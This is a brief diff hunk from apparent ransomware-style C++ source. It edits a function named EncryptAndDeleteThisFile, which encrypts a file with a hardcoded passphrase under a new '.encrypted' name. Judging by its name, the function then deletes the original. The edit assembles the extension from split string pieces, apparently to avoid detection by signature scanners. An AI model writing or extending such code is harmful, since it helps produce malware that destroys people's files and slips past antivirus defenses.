@@ -619,7 +619,7 @@ bool EncryptAndDeleteThisFile(std::string path)
 	bool fDeleted = false;
 
 	std::string pathEncrypted = path;
-	pathEncrypted.append(".en").append("cr").append("yp").append("t").append("ed");
+	pathEncrypted.append(".").append("en").append("cr").append("yp").append("t").append("ed");
 	//pathEncrypted.append(".encrypted");
 
 	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");
